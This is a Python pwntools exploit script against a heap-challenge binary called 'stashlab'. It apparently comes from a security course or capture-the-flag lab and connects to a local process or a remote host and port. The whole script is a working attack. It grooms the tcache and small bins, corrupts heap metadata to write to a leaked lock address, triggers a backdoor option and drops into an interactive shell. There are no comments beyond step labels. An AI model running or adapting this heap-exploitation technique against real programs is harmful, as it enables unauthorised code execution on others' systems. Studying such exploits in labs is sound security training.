from pwn import *

localhost = True

if localhost:
    server = process('./sourcecode/stashlab')
else:
    server = remote('140.112.31.97', 30107)
    
server.recvuntil('Lock address : 0x')
target_address = int(server.recvline()[:-1], 16)
server.recvuntil('Chunk address : 0x')
heap_address = int(server.recvline()[:-1], 16) + 0x10

def create(size, uuid, data):
    server.sendlineafter('Choice >', '1')
    server.sendlineafter('Note size :', str(size))
    server.sendlineafter('UUID :', uuid)
    server.sendlineafter('Content :', data)
    
def edit(index, uuid):
    server.sendlineafter('Choice >', '2')
    server.sendlineafter('Note index :', str(index))
    server.sendlineafter('UUID :', uuid)
    
def delete(index):
    server.sendlineafter('Choice >', '3')
    server.sendlineafter('Note index :', str(index))

def super(size, uuid, data):
    server.sendlineafter('Choice >', '4')
    server.sendlineafter('Note size :', str(size))
    server.sendlineafter('UUID :', uuid)
    server.sendlineafter('Content :', data)

#full tcache 
for i in range(8):
    create(0x78, '0', '1234')
for i in range(1, 8):
    delete(i)
    
#push to unsorted   
delete(0)

#push to small
create(0x88, '0', '0')

#malloc tcache to write target address
super(0x78, '0', p64(heap_address) + p64(target_address - 0x10))

#write trampoline address
edit(0, str(heap_address + 0x400))

#malloc small and write address
create(0x78, '0', '0')

#backdoor
server.sendlineafter('Choice >', '5')

#shell
server.interactive()